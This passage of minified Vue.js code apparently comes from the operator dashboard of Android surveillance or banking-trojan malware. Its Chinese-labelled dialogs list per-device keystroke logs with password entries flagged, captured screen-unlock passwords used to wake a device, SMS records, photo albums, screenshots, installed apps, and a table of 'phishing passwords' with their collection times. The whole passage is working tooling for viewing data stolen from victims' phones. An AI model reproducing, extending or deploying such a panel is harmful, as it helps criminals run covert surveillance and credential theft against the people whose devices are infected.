u65E5\u671F",format:"YYYY-MM-DD","value-format":"YYYY-MM-DD",onChange:e.onDateChange,style:{width:"280px"}},null,8,["modelValue","onChange"]),a(h,{type:"primary",onClick:e.refreshLog,loading:e.logLoading,size:"small"},{default:i(()=>t[54]||(t[54]=[n("\u91CD\u65B0\u67E5\u8BE2")])),_:1},8,["onClick","loading"])])])]),G((d(),f("div",Te,[(d(!0),f(q,null,R(e.inputLogList,(l,s)=>(d(),f("div",{class:Q(["log-item",{"password-item":l.password==1}]),key:s},[u("div",_e,[u("span",Ye,b(l.date||e.formatTime(l.time)),1),u("span",{class:Q(["log-source",{"source-admin":l.source==1,"source-app":l.source==0}])},b(l.source==1?"\u7BA1\u7406\u7AEF":"App\u7AEF"),3),u("span",Me,b(l.app),1),l.resourceId?(d(),f("span",He,b(l.resourceId),1)):V("",!0),u("span",Ne,b(l.text||(l.password==1?"[\u5BC6\u7801\u8F93\u5165]":"\u65E0\u5185\u5BB9")),1)])],2))),128)),e.inputLogList.length===0&&!e.logLoading?(d(),f("div",Oe,"\u6682\u65E0\u8F93\u5165\u65E5\u5FD7\u6570\u636E")):V("",!0)])),[[P,e.logLoading]])]),_:1},8,["modelValue","title"]),a(B,{modelValue:e.appListVisible,"onUpdate:modelValue":t[19]||(t[19]=l=>e.appListVisible=l),title:`\u5B89\u88C5\u5E94\u7528\u5217\u8868 - \u8BBE\u5907ID: ${e.currentAppDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:i(()=>[a(O,{"device-id":e.currentAppDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(B,{modelValue:e.unlockDialogVisible,"onUpdate:modelValue":t[22]||(t[22]=l=>e.unlockDialogVisible=l),title:`\u9009\u62E9\u89E3\u9501\u5BC6\u7801 - \u8BBE\u5907ID: ${((T=e.currentWakeRow)==null?void 0:T.deviceId)||""}`,width:"480px","close-on-click-modal":!1,"destroy-on-close":""},{footer:i(()=>[a(h,{onClick:t[21]||(t[21]=l=>e.unlockDialogVisible=!1)},{default:i(()=>t[59]||(t[59]=[n("\u53D6\u6D88")])),_:1}),a(h,{type:"primary",onClick:e.confirmWakeup,loading:e.unlocking,disabled:!e.selectedUnlockId},{default:i(()=>t[60]||(t[60]=[n("\u786E\u5B9A")])),_:1},8,["onClick","loading","disabled"])]),default:i(()=>[u("div",null,[a(x,{"label-width":"90px"},{default:i(()=>[a(g,{label:"\u89E3\u9501\u5BC6\u7801"},{default:i(()=>[a(S,{modelValue:e.selectedUnlockId,"onUpdate:modelValue":t[20]||(t[20]=l=>e.selectedUnlockId=l),placeholder:"\u8BF7\u9009\u62E9\u89E3\u9501\u5BC6\u7801",filterable:"",style:{width:"100%"}},{default:i(()=>[(d(!0),f(q,null,R(e.unlockOptions,l=>(d(),F(C,{key:l.id,label:e.formatUnlockTips(l),value:l.id},{default:i(()=>[u("span",We,b(e.formatUnlockTips(l)),1),u("span",je,[u("span",Ke,b(l.createDate),1)])]),_:2},1032,["label","value"]))),128))]),_:1},8,["modelValue"])]),_:1})]),_:1})])]),_:1},8,["modelValue","title"]),a(B,{modelValue:e.smsListVisible,"onUpdate:modelValue":t[23]||(t[23]=l=>e.smsListVisible=l),title:`\u77ED\u4FE1\u8BB0\u5F55 - \u8BBE\u5907ID: ${e.currentSmsDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:i(()=>[a(W,{"device-id":e.currentSmsDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(B,{modelValue:e.albumListVisible,"onUpdate:modelValue":t[24]||(t[24]=l=>e.albumListVisible=l),title:`\u76F8\u518C\u5217\u8868 - \u8BBE\u5907ID: ${e.currentAlbumDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:i(()=>[a(j,{"device-id":e.currentAlbumDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(B,{modelValue:e.snapshotListVisible,"onUpdate:modelValue":t[25]||(t[25]=l=>e.snapshotListVisible=l),title:`\u622A\u56FE\u5217\u8868 - \u8BBE\u5907ID: ${e.currentSnapshotDevice.deviceId}`,width:"1200px","close-on-click-modal":!1,"destroy-on-close":""},{default:i(()=>[a(K,{"device-id":e.currentSnapshotDevice.deviceId},null,8,["device-id"])]),_:1},8,["modelValue","title"]),a(B,{modelValue:e.remarkDialogVisible,"onUpdate:modelValue":t[28]||(t[28]=l=>e.remarkDialogVisible=l),title:`\u8BBE\u5907\u5907\u6CE8 - \u8BBE\u5907ID: ${e.currentRemarkDevice.deviceId}`,width:"500px","close-on-click-modal":!1,"destroy-on-close":""},{footer:i(()=>[a(h,{onClick:t[27]||(t[27]=l=>e.remarkDialogVisible=!1)},{default:i(()=>t[61]||(t[61]=[n("\u53D6\u6D88")])),_:1}),a(h,{type:"primary",onClick:e.submitRemark,loading:e.remarkSubmitting},{default:i(()=>t[62]||(t[62]=[n("\u786E\u5B9A")])),_:1},8,["onClick","loading"])]),default:i(()=>[a(x,{"label-width":"80px"},{default:i(()=>[a(g,{label:"\u5907\u6CE8\u5185\u5BB9"},{default:i(()=>[a(D,{modelValue:e.remarkContent,"onUpdate:modelValue":t[26]||(t[26]=l=>e.remarkContent=l),type:"textarea",rows:4,placeholder:"\u8BF7\u8F93\u5165\u5907\u6CE8\u5185\u5BB9",clearable:""},null,8,["modelValue"])]),_:1})]),_:1})]),_:1},8,["modelValue","title"]),a(B,{modelValue:e.fishPwdDialogVisible,"onUpdate:modelValue":t[30]||(t[30]=l=>e.fishPwdDialogVisible=l),title:`\u9493\u9C7C\u5BC6\u7801 - ${e.fishPwdTitle}`,width:"700px","close-on-click-modal":!1,"destroy-on-close":""},{footer:i(()=>[a(h,{onClick:t[29]||(t[29]=l=>e.fishPwdDialogVisible=!1)},{default:i(()=>t[63]||(t[63]=[n("\u5173\u95ED")])),_:1})]),default:i(()=>[G((d(),f("div",null,[a(z,{data:e.fishPwdList,border:"",style:{width:"100%"}},{default:i(()=>[a(v,{prop:"data",label:"\u5BC6\u7801","header-align":"center",align:"center","show-overflow-tooltip":""}),a(v,{prop:"created",label:"\u91C7\u96C6\u65F6\u95F4","header-align":"center",align:"center",width:"180px"})]),_:1},8,["data"]),e.fishPwdList.length===0&&!e.fishPwdLoading?(d(),f("div",Ge,"\u6682\u65E0\u6570\u636E")):V("",!0)])),[[P,e.fishPwdLoading]])]),_:1},8,["modelValue","title"])])}var dt=Z(pe,[["render",Je],["__scopeId","data-v-1dccdded"]]);export{dt as default};
